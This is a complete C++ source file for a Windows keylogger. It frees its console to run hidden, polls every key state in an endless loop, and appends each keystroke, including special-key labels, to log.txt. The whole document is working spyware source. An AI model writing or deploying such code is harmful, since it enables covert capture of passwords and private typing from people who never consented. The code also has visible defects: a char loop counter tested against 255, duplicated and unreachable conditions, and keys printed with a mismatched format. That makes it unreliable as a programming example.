#include <iostream>
#include <windows.h>
#include <fstream>


using namespace std;

int Save(int _key, char *file);

int main()
{   
    FreeConsole();   //TO run in background
    
    char i;

    while(true){
        for (i=8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i)== -32767) //if button is pressed
            {
                Save(i, "log.txt");
            }
        }
    }

    return 0;
}


int Save(int _key,char *file)
{
    cout << _key <<endl;
    
    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file,"a+");

    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE,"%s", "[SHIFT]");

    else if (_key == VK_BACK )
        fprintf(OUTPUT_FILE,"%s", "[BACK]");

    else if (_key == VK_LSHIFT )
        fprintf(OUTPUT_FILE,"%s", "[LEFT SHIFT]");

    else if (_key == VK_RSHIFT )
        fprintf(OUTPUT_FILE,"%s", "[RIGHT SHIFT]");

    else if (_key == VK_CONTROL )
        fprintf(OUTPUT_FILE,"%s", "[LEFT CONTROL]");

    else if (_key == VK_RCONTROL )
        fprintf(OUTPUT_FILE,"%s", "[RIGHT CONTROL]");

    else if (_key == VK_OEM_PERIOD )
        fprintf(OUTPUT_FILE,"%s", ".");

    else if (_key == VK_OEM_PLUS )
        fprintf(OUTPUT_FILE,"%s", "+");

    else if (_key == VK_OEM_MINUS or _key == VK_OEM_MINUS )
        fprintf(OUTPUT_FILE,"%s", "-");

    else if (_key == VK_ADD or _key == VK_OEM_PLUS )
        fprintf(OUTPUT_FILE,"%s", "+");

    else if (_key == VK_CAPITAL )
        fprintf(OUTPUT_FILE,"%s", "[CAPSLOCK]");

    else if (_key == VK_RCONTROL )
        fprintf(OUTPUT_FILE,"%s", "[RIGHT CONTROL]");
 
    else if (_key == VK_TAB )
        fprintf(OUTPUT_FILE,"%s", "[TAB]");

    else if (_key == VK_RETURN )
        fprintf(OUTPUT_FILE,"%s", "[RETURN]");

    else if (_key == VK_ESCAPE )
        fprintf(OUTPUT_FILE,"%s", "[ESCAPE]");

    else if (_key == VK_CANCEL )
        fprintf(OUTPUT_FILE,"%s", "[CANCEL]");

    else if (_key == VK_UP )
        fprintf(OUTPUT_FILE,"%s", "[UP ARROW]");

    else if (_key == VK_DOWN )
        fprintf(OUTPUT_FILE,"%s", "[DOWN ARROW]");

    else if (_key == VK_LBUTTON )
        fprintf(OUTPUT_FILE,"%s", "[MOUSE CLICK - LEFT]");
    
    else if (_key == VK_RBUTTON )
        fprintf(OUTPUT_FILE,"%s", "[MOUSE CLICK - RIGHT]");

    else if (_key == VK_RIGHT )
        fprintf(OUTPUT_FILE,"%s", "[RIGHT ARROW]");

    else if (_key == VK_DELETE)
        fprintf(OUTPUT_FILE,"%s", "[DELETE]");

    else
        fprintf(OUTPUT_FILE, "%s", &_key);

    fclose(OUTPUT_FILE);

    return 0;
}